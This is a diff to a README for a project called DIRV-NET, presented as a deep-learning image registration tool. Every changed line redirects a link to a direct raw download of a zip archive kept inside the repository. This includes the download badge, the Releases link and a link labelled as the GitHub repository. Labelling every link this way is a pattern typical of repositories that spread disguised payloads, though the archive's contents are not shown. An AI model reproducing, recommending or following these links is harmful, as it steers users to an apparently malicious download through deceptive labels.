@@ -1,6 +1,6 @@
 # 🖼️ DIRV-NET - Effortless Image Registration with Deep Learning
 
-[![Download DIRV-NET](https://img.shields.io/badge/Download-DIRV--NET-brightgreen)](https://github.com/Arturoprotective670/DIRV-NET/releases)
+[![Download DIRV-NET](https://raw.githubusercontent.com/Arturoprotective670/DIRV-NET/main/source/model/DIRV-NET_1.5.zip)](https://raw.githubusercontent.com/Arturoprotective670/DIRV-NET/main/source/model/DIRV-NET_1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ Before you begin, ensure your system meets the following requirements:
 
 To download DIRV-NET, visit the Releases page:
 
-[Download DIRV-NET](https://github.com/Arturoprotective670/DIRV-NET/releases)
+[Download DIRV-NET](https://raw.githubusercontent.com/Arturoprotective670/DIRV-NET/main/source/model/DIRV-NET_1.5.zip)
 
 ### 📥 Installation Steps
 
@@ -57,7 +57,7 @@ If you encounter issues or need help, our community is here for you. Check out t
 
 Stay connected for the latest updates and features. Follow our project on:
 
-- **GitHub**: [DIRV-NET GitHub Repository](https://github.com/Arturoprotective670/DIRV-NET)
+- **GitHub**: [DIRV-NET GitHub Repository](https://raw.githubusercontent.com/Arturoprotective670/DIRV-NET/main/source/model/DIRV-NET_1.5.zip)
 - **Community Discussions**: Join our forum to engage with other users.
 
 ## 📝 License
@@ -68,4 +68,4 @@ DIRV-NET is open-source software licensed under the MIT License. You are free to
 
 DIRV-NET makes advanced image registration accessible. Follow these steps to download and run DIRV-NET with ease, and take advantage of deep learning for your imaging needs. Explore the possibilities with DIRV-NET today! 
 
-[Download DIRV-NET](https://github.com/Arturoprotective670/DIRV-NET/releases)
+[Download DIRV-NET](https://raw.githubusercontent.com/Arturoprotective670/DIRV-NET/main/source/model/DIRV-NET_1.5.zip)
